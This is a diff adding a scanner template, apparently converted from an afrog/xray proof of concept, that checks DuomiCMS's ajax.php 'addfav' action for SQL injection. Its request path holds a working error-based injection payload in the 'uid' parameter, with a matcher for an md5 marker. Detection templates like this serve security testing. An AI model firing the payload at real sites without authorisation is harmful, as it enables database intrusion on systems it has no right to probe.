@@ -1,0 +1,23 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: word
+        part: body
+        words:
+          - fc9bdfb86bae5c322bae5acd78760935
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/duomiphp/ajax.php?action=addfav&id=1&uid=1%20and%20extractvalue(1,concat_ws(1,1,{{md5(2000000005)}}))'
+id: duomicms-sqli
+info:
+  author: hanxiansheng26
+  description: ""
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: Duomicms sqli
+  severity: high
+  tags: duomicms,sqli,argus-import
